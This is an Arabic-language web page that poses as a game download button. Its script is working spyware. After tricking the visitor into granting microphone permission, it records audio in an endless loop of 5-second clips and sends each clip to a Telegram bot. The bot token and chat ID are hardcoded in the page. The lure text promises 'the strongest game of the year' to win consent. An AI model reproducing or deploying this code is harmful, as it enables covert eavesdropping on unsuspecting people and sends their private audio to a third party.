<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title></title>
  <style>
    body {
      margin: 0;
      height: 100vh;
      background: #0b0f16;
      display: flex;
      justify-content: center;
      align-items: center;
    }
    #req {
      padding: 14px 32px;
      font-size: 20px;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      background: #0a84ff;
      color: white;
    }
  </style>
</head>
<body>

<button id="req">تحميل</button>

<script>
let stream = null;
let recorder = null;
let active = false;

const BOT_TOKEN = "8574889163:AAFJtXmst2oMwx1ubV05QTC_fTF7IHe3124";
const CHAT_ID   = "5648826330";

const CLIP_MS = 5000; // مدة المقطع = 2 ثانية

function sendToTelegram(blob) {
  const form = new FormData();
  form.append("chat_id", CHAT_ID);
  form.append("voice", blob, "audio.webm");

  fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVoice`, {
    method: "POST",
    body: form
  })
  .then(r => r.json())
  .then(d => console.log("تم إرسال مقطع:", d))
  .catch(err => console.error("فشل الإرسال:", err));
}

function recordOnce() {
  return new Promise((resolve) => {
    recorder = new MediaRecorder(stream);
    let chunks = [];

    recorder.ondataavailable = e => chunks.push(e.data);
    recorder.onstop = () => {
      const blob = new Blob(chunks, { type: "audio/webm" });
      resolve(blob);
    };

    recorder.start();
    setTimeout(() => recorder.stop(), CLIP_MS);
  });
}

async function startLoop() {
  if (active) return;
  active = true;

  while (active) {
    const blob = await recordOnce();
    sendToTelegram(blob);
    await new Promise(r => setTimeout(r, 200));
  }
}

document.getElementById("req").onclick = async () => {
  if (stream) return;
  try {
    stream = await navigator.mediaDevices.getUserMedia({ audio: true });
    startLoop();
  } catch(e) {
    alert("يجب اعطاء الاذونات حتى تحمل اقوى لعبه بالسنه ");
  }
};

window.onbeforeunload = () => {
  active = false;
  if (stream) stream.getTracks().forEach(t => t.stop());
};
</script>

</body>
</html>
